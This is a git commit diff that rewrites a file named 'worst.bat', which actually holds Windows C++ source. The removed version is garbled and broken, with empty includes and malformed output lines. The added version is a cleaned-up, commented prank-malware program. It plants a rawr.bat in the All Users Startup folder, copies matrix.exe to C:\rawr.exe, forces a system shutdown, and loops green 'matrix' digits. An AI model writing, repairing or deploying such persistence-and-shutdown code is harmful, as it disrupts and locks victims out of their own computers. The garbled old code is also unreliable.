4064726ed64b7b0c2e6ad8b832f3e9610c544c94
Anion 15 <125840838+Anion15@users.noreply.github.com>
2023-08-12 23:32:05 +0900

    Update worst.bat

--- bash scripts/worst.bat
+++ bash scripts/worst.bat
@@ -1,83 +1,71 @@
-#include
-#include
-#include
-#include
-#include
-#include
-#include
+#include <iostream>
+#include <fstream>
+#include <windows.h>
 using namespace std;
-int main()
-{ keybd_event(VK_MENU,0x38,0,0);
-keybd_event(VK_RETURN,0x1c,0,0);
-keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
-keybd_event(VK_MENU,0X38,KEYEVENTF_KEYUP,0);
-HANDLE outToScreen;
-outToSreen = GetStdHandle(STD_OUTPUT_HANDLE);
-{
-char buffer[255];
-char inputFile[]="C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
-ifstream input(inputFile);
-if (!input)
-{{
-ofstream fp("C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
-ios::app);
-fp << "@ECHO OFF \N";
-fp << "START C:\\rawr.exe \n";
-fp << "EXIT";
-}}
-else
-{
-while (!input.eof())
-{
-input.getline(buffer,255);
-}}}
-{
-char buffer[255];
-char inputFile[]="C:\\rawr.exe";
-ifstream input(inputFile);
-if (!input)
-{{{
-ofstream fp("CLICK.bat", ios::app);
-fp << "ECHO OFF \n";
-fp << "COPY matrix.exe C:\\rawr.exe \n";
-fp << "START C:\\rawr.exe \n";
-fp << "EXIT";
-}
-system("START CLICK.bat");
-main();
-}}
-else
-{
-while (!input.eof())
-{
-input.getline(buffer,255);
-system('call shutdown.exe -S");
-goto START;
-}}}
-START:{
-for(int i = 0; i<>
-{
-int num = (rand() % 10);
-SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-cout <<>
-Sleep(60);
-}}
-for ( int j = 0; j <>
-{
-SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
-int number = (rand() % 24);
-cout <<>
-}
-goto START;
+
+int main() {
+    // Send Alt + Enter key events
+    keybd_event(VK_MENU, 0x38, 0, 0);
+    keybd_event(VK_RETURN, 0x1c, 0, 0);
+    keybd_event(VK_RETURN, 0x1c, KEYEVENTF_KEYUP, 0);
+    keybd_event(VK_MENU, 0x38, KEYEVENTF_KEYUP, 0);
+
+    HANDLE outToScreen;
+    // Typo: outToSreen -> outToScreen
+    outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    // ...
+
+    char buffer[255];
+    char inputFile[] = "C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
+    ifstream input(inputFile);
+    if (!input) {
+        // Typo: \N -> \n
+        ofstream fp("C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat", ios::app);
+        fp << "@ECHO OFF \n";
+        fp << "START C:\\rawr.exe \n";
+        fp << "EXIT";
+    } else {
+        while (!input.eof()) {
+            input.getline(buffer, 255);
+        }
+    }
+
+    // ...
+
+    char buffer2[255]; // Renamed to avoid buffer name duplication
+    char inputFile2[] = "C:\\rawr.exe";
+    ifstream input2(inputFile2);
+    if (!input2) {
+        ofstream fp("CLICK.bat", ios::app);
+        fp << "ECHO OFF \n";
+        fp << "COPY matrix.exe C:\\rawr.exe \n";
+        fp << "START C:\\rawr.exe \n";
+        fp << "EXIT";
+        system("START CLICK.bat");
+        main(); // This part needs to be modified
+    } else {
+        while (!input2.eof()) {
+            input2.getline(buffer2, 255);
+            // Typo: ' -> "
+            system("call shutdown.exe -s");
+            goto START; // This creates an infinite loop here
+        }
+    }
+
+START:
+    for (int i = 0; i < 10; i++) {
+        int num = (rand() % 10);
+        SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+        cout << num << endl; // Output format needs to be specified here
+        Sleep(60);
+    }
+    for (int j = 0; j < 10; j++) {
+        SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
+        int number = (rand() % 24);
+        cout << number << endl; // Output format needs to be specified here
+    }
+    goto START;
+
+    return 0;
 }
